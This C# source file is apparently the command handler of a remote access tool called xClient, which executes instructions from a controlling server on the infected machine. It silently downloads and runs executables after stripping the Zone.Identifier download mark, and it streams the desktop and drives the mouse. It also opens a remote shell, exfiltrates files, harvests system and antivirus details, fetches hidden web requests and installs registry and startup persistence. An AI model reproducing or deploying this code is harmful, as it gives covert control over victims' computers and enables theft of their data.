using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.RemoteShell;
using xClient.Core.Helper;
using System.Drawing.Imaging;

namespace xClient.Core.Commands
{
    public static class CommandHandler
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteFile(string name);

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        public static UnsafeStreamCodec StreamCodec;
        public static Bitmap LastDesktopScreenshot;
        private static Shell _shell;
        private static Dictionary<int, string> _cancledDownloads = new Dictionary<int, string>();

        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
        private const string DELIMITER = "$E$";

        public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
        {
            SystemCore.InitializeGeoIp();
            new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
                SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex,
                SystemCore.GetId(),SystemCore.GetLanIp(),SystemCore.GetPcName()).Execute(client);
        }

        public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
            Client client)
        {
            new Packets.ClientPackets.Status("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.Status("Downloaded File!").Execute(client);

                try
                {
                    DeleteFile(tempFile + ":Zone.Identifier");

                    var bytes = File.ReadAllBytes(tempFile);
                    if (bytes[0] != 'M' && bytes[1] != 'Z')
                        throw new Exception("no pe file");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    DeleteFile(tempFile);
                    new Packets.ClientPackets.Status("Execution failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.Status("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
        {
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                command.FileName);

            try
            {
                if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
                    throw new Exception("No executable file");

                FileSplit destFile = new FileSplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                {
                    new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                        client);
                    return;
                }

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    DeleteFile(filePath + ":Zone.Identifier");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    new Packets.ClientPackets.Status("Executed File!").Execute(client);
                }
            }
            catch (Exception ex)
            {
                DeleteFile(filePath);
                new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
        {
            new Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);

            if (Settings.STARTUP)
            {
                if (SystemCore.AccountType == "Admin")
                {
                    try
                    {
                        using (
                            RegistryKey key =
                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                        // try deleting from Registry.CurrentUser
                        using (
                            RegistryKey key =
                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                }
                else
                {
                    try
                    {
                        using (
                            RegistryKey key =
                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }

            try
            {
                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".bat"));

                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    ;

                File.WriteAllText(filename, uninstallBatch);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = filename
                };
                Process.Start(startInfo);
            }
            finally
            {
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
        }

        public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
        {
            if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality ||
                StreamCodec.Monitor != command.Monitor)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);

            LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Monitor);
            BitmapData bmpdata = LastDesktopScreenshot.LockBits(
                new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
                LastDesktopScreenshot.PixelFormat);

            using (MemoryStream stream = new MemoryStream())
            {
                try
                {
                    StreamCodec.CodeImage(bmpdata.Scan0,
                        new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                        new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                        LastDesktopScreenshot.PixelFormat,
                        stream);
                    new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                        StreamCodec.Monitor).Execute(client);
                }
                catch
                {
                    new Packets.ClientPackets.DesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor)
                        .Execute(client);
                    StreamCodec = null;
                }
            }

            LastDesktopScreenshot.UnlockBits(bmpdata);
            LastDesktopScreenshot.Dispose();
        }

        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (Process p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
        }

        public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            {
            }

            HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
        }

        public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo {UseShellExecute = true, FileName = command.Processname};
            Process.Start(startInfo);

            HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
        }

        public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
        {
            new Packets.ClientPackets.DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
        }

        public static void HandleDirectory(Packets.ServerPackets.Directory command, Client client)
        {
            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] {DELIMITER};
                    filessize = new long[] {0};
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] {DELIMITER};

                new Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch
            {
                new Packets.ClientPackets.DirectoryResponse(new string[] {DELIMITER}, new string[] {DELIMITER},
                    new long[] {0}).Execute(client);
            }
        }

        public static void HandleDownloadFile(Packets.ServerPackets.DownloadFile command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                            srcFile.LastError).Execute(client);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (_cancledDownloads.ContainsKey(command.ID)) return;

                        byte[] block;
                        if (srcFile.ReadBlock(currentBlock, out block))
                        {
                            new Packets.ClientPackets.DownloadFileResponse(command.ID,
                                Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                                srcFile.LastError).Execute(client);
                            //Thread.Sleep(200);
                        }
                        else
                            new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                                srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
            }).Start();
        }

        public static void HandleDownloadFileCanceled(Packets.ServerPackets.DownloadFileCanceled command, Client client)
        {
            if (!_cancledDownloads.ContainsKey(command.ID))
            {
                _cancledDownloads.Add(command.ID, "canceled");
                new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(
                    client);
            }
        }

        public static void HandleMouseClick(Packets.ServerPackets.MouseClick command, Client client)
        {
            if (command.LeftClick)
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
                }
            }
            else
            {
                SetCursorPos(command.X, command.Y);
                mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
                }
            }
        }

        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
        {
            try
            {
                string[] infoCollection = new string[]
                {
                    "Processor (CPU)",
                    SystemCore.GetCpu(),
                    "Memory (RAM)",
                    string.Format("{0} MB", SystemCore.GetRam()),
                    "Video Card (GPU)",
                    SystemCore.GetGpu(),
                    "Username",
                    SystemCore.GetUsername(),
                    "PC Name",
                    SystemCore.GetPcName(),
                    "Uptime",
                    SystemCore.GetUptime(),
                    "MAC Address",
                    SystemCore.GetMacAddress(),
                    "LAN IP Address",
                    SystemCore.GetLanIp(),
                    "WAN IP Address",
                    SystemCore.WanIp,
                    "Antivirus",
                    SystemCore.GetAntivirus(),
                    "Firewall",
                    SystemCore.GetFirewall()
                };

                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleVisitWebsite(Packets.ServerPackets.VisitWebsite command, Client client)
        {
            string url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest) HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse) request.GetResponse())
                        {
                            using (Stream dataStream = response.GetResponseStream())
                            {
                            }
                        }
                    }
                    catch
                    {
                    }
                }

                new Packets.ClientPackets.Status("Visited Website").Execute(client);
            }
        }

        public static void HandleShowMessageBox(Packets.ServerPackets.ShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(null, command.Text, command.Caption,
                    (MessageBoxButtons) Enum.Parse(typeof (MessageBoxButtons), command.MessageboxButton),
                    (MessageBoxIcon) Enum.Parse(typeof (MessageBoxIcon), command.MessageboxIcon));
            }).Start();

            new Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
        }

        public static void HandleUpdate(Packets.ServerPackets.Update command, Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            new Packets.ClientPackets.Status("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadURL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.Status("Downloaded File!").Execute(client);

                new Packets.ClientPackets.Status("Updating...").Execute(client);

                try
                {
                    DeleteFile(tempFile + ":Zone.Identifier");

                    var bytes = File.ReadAllBytes(tempFile);
                    if (bytes[0] != 'M' && bytes[1] != 'Z')
                        throw new Exception("no pe file");

                    string filename = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        Helper.Helper.GetRandomFilename(12, ".bat"));

                    string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                        ? "@echo off" + "\n" +
                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
                          "ping -n 20 localhost > nul" + "\n" +
                          "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "del " + "\"" + filename + "\""
                        : "@echo off" + "\n" +
                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
                          "ping -n 20 localhost > nul" + "\n" +
                          "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "del " + "\"" + filename + "\""
                        ;

                    File.WriteAllText(filename, uninstallBatch);
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = true;
                    startInfo.FileName = filename;
                    Process.Start(startInfo);

                    SystemCore.Disconnect = true;
                    client.Disconnect();
                }
                catch
                {
                    DeleteFile(tempFile);
                    new Packets.ClientPackets.Status("Update failed!").Execute(client);
                    return;
                }
            }).Start();
        }

        public static void HandleMonitors(Packets.ServerPackets.Monitors command, Client client)
        {
            new Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
        }

        public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
        {
            if (_shell == null)
                _shell = new Shell();

            string input = command.Command;

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
            {
                _shell.CloseSession();
                _shell = null;
            }
        }

        public static void HandleRename(Packets.ServerPackets.Rename command, Client client)
        {
            try
            {
                if (command.IsDir)
                    Directory.Move(command.Path, command.NewPath);
                else
                    File.Move(command.Path, command.NewPath);

                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch
            {
            }
        }

        public static void HandleDelete(Packets.ServerPackets.Delete command, Client client)
        {
            try
            {
                if (command.IsDir)
                    Directory.Delete(command.Path, true);
                else
                    File.Delete(command.Path);

                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
            }
            catch
            {
            }
        }

        public static void HandleAction(Packets.ServerPackets.Action command, Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Mode)
                {
                    case 0:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 1:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 2:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch
            {
                new Packets.ClientPackets.Status("Action failed!").Execute(client);
            }
        }

        public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
        {
            try
            {
                Dictionary<string, int> startupItems = new Dictionary<string, int>();

                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 0);
                    }
                }
                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 1);
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false)
                    )
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 2);
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
                    }
                }
                if (
                    Directory.Exists(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                {
                    var files =
                        new DirectoryInfo(
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
                    foreach (var file in files)
                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 4);
                }
                if (
                    Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                {
                    var files =
                        new DirectoryInfo(
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
                    foreach (var file in files)
                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 5);
                }

                new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch
            {
                new Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
            }
        }

        public static void HandleAddStartupItem(Packets.ServerPackets.AddStartupItem command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 1:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 2:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 3:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 4:
                        if (
                            !Directory.Exists(
                                Path.Combine(
                                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                            throw new Exception();

                        string lnkPath =
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                    case 5:
                        if (
                            !Directory.Exists(
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                            throw new Exception();

                        string lnkPath2 =
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath2, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch
            {
                new Packets.ClientPackets.Status("Adding Autostart Item failed!").Execute(client);
            }
        }
    }
}